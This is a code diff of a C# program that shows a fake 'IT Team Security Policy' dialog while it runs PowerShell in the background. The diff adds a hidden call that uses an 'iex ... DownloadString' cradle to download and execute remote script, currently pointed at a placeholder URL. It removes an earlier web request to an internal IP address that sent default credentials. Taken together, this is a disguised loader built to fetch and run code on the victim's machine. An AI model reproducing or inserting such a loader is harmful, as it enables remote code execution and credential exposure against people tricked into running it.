@@ -15,21 +15,23 @@ public class Program
 {
     public static void Main()
     {
+
+        Execution.MeMe();
         MessageBox.Show("Loading Security Services...", "IT Team Security Policy", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
     }
-    public class Code
+    public class Execution
     {
-        public static void Exec()
+        public static void MeMe()
         {
-            string command = "Invoke-WebRequest -URI http://192.168.200.128:80/a -UseDefaultCredentials > null";
             RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
             Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
             rspace.Open();
             Pipeline pipeline = rspace.CreatePipeline();
-            pipeline.Commands.AddScript(command);
+            pipeline.Commands.AddScript("iex ((New-Object Net.WebClient).DownloadString('https://www.google.com/robots.txt'))");
             pipeline.Invoke();
         }
     }
 }
+
 ```
 
